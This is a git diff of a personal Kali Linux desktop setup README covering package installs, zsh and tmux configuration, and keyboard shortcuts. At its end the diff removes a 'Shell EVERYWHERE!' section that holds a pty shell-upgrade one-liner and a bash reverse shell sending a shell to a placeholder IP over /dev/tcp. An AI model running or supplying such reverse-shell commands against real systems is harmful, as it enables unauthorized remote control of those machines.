@@ -15,12 +15,7 @@ Setup for my Desktop, some configurations for my Desktop themes and shortcuts.
 
 ### Must HAVE Apps!!!
 ```
-sudo apt install git wget curl python3-pip
-sudo apt install neofetch tree htop fonts-noto-color-emoji telegram-desktop
-sudo apt install polybar rofi ranger
-sudo apt install zsh tmux fonts-powerline tilix python3-nautilus
-sudo ln -s /etc/profile.d/vte-2.91.sh /etc/profile.d/vte.sh
-sudo update-alternatives --config x-terminal-emulator
+sudo apt install git wget curl python3-pip neofetch tree htop fonts-noto-color-emoji telegram-desktop polybar rofi ranger zsh tmux fonts-powerline tilix python3-nautilus
 ```
 - https://github.com/zyairelai/kali-anonsurf
 - https://marktext.app/
@@ -36,9 +31,10 @@ git clone https://github.com/bhilburn/powerlevel9k.git ~/.oh-my-zsh/custom/theme
 nano ~/.oh-my-zsh/lib/directories.zsh
 alias ll='ls -lh --group-directories-first'
 chsh -s $(which zsh)
+sudo ln -s /etc/profile.d/vte-2.91.sh /etc/profile.d/vte.sh
+sudo update-alternatives --config x-terminal-emulator
 tmux source-file .tmux.conf
 ```
-- [Hack Nerd Fonts](https://github.com/ryanoasis/nerd-fonts/blob/master/patched-fonts/Hack/Regular/complete/Hack%20Regular%20Nerd%20Font%20Complete.ttf)
 
 ### Personal Terminal Shortcuts
 ```
@@ -62,13 +58,3 @@ sudo ln -s /bin/ranger /bin/r
 | Alt + W                | Close window                                       |
 | Ctrl + Alt + P         | bash /home/kali/.config/polybar/launch.sh --shapes |
 | Ctrl + Alt + M         |  Marktext                                          |
-
-### Shell EVERYWHERE!
-1. Reversed Shell
-```
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-2. Stable Shell
-```
-bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
-```
